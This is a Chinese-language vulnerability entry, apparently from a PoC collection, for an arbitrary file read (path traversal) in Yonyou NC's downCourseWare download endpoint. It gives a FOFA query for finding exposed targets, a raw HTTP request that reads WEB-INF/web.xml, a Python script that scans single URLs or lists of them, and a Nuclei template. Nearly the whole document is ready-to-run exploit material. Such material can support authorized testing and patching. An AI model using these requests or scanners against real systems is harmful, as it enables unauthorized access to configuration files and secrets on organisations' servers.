## 用友NC-downCourseWare任意文件读取

用友NC `downCourseWare`接口存在任意文件读取漏洞，未授权攻击者可以利用其读取网站配置文件等敏感信息。

## fofa

```
title=="YONYOU NC"
```

## poc

```
GET /portal/pt/downCourseWare/download?fileName=../webapps/nc_web/WEB-INF/web.xml&pageId=login  HTTP/1.1
Host: ip
```

![image-20240607191758304](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406071917393.png)

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import argparse
import time
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    try:
        # 构造完整的攻击URL
        attack_url = url.rstrip('/') + "/portal/pt/downCourseWare/download?fileName=%2e%2e/webapps/nc_web/WEB-INF/web.xml&pageId=login"
  
        response = requests.get(attack_url, verify=False, timeout=10)
  
        if response.status_code == 200 and 'web-app' in response.text:
            print(f"{RED}URL [{url}] 可能存在用友NC downCourseWare任意文件读取漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.exceptions.Timeout:
        print(f"URL [{url}] 请求超时，可能存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在用友NC downCourseWare任意文件读取漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
```



### **Yaml**

```
id: yonyou-nc-downCourseWare-fileread

info:
  name: 用友NC downCourseWare任意文件读取
  author: onewin
  severity: high
  description: 用友NC downCourseWare任意文件读取
  metadata:
    fofa-query: title=="YONYOU NC"
  tags: yonyou,fileread

http:
- raw:
  - |+
    @timeout: 30s
    GET /portal/pt/downCourseWare/download?fileName=../webapps/nc_web/WEB-INF/web.xml&pageId=login  HTTP/1.1
    Host: {{Hostname}}


  max-redirects: 3
  matchers-condition: and
  matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "web-app"
        part: body
```

